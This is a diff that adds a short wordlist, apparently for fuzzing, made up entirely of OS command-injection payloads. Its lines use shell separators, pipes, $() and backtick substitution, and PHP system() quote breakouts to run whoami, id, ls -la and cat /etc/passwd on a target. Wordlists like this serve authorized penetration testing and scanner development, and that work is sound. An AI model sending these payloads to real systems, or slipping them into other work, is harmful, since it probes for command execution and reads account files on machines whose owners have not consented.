@@ -1,0 +1,15 @@
+; whoami
+; ls -la
+| whoami
+&& whoami
+|| whoami
+; id
+; cat /etc/passwd
+| cat /etc/passwd
+&& cat /etc/passwd
+'; system('whoami');
+"; system('whoami');
+|id
+$(whoami)
+`whoami`
+;whoami
